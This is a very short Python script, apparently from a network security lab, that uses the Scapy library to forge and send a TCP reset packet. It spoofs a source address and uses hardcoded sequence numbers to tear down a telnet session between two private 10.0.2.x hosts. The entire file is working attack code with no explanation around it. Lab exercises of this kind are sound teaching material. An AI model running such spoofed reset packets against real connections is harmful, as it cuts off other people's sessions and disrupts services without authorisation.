#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=23, dport=59498, flags="R", seq=199921803, ack=1577076274)

pkt = ip / tcp
ls(pkt)
send(pkt, verbose=0)